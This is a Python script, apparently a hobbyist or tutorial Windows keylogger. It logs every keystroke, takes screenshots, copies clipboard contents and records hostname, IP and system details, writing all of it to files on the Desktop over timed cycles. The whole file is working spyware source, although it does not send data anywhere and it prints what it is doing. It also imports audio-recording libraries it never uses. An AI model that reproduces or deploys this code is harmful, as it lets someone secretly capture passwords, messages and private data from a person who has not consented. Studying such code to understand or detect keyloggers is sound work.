# Libraries
import socket
import platform
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import time
import os

# File paths
from pathlib import Path

desktop_path = str(Path.home() / "Desktop")  # Get Desktop path automatically
extend = "\\"

system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"

# Time Controls
time_iteration = 15   # in seconds
number_of_iterations_end = 2


# Get Computer and Network Information
def computer_information():
    with open(desktop_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")

computer_information()

#  clipboard 
def copy_clipboard():
    with open(desktop_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied.")


def screenshot():
    im = ImageGrab.grab()
    im.save(desktop_path + extend + screenshot_information)


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(desktop_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
       
        screenshot()
      
        copy_clipboard()
   
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

print("Keylogger stopped. Files saved at:", desktop_path)


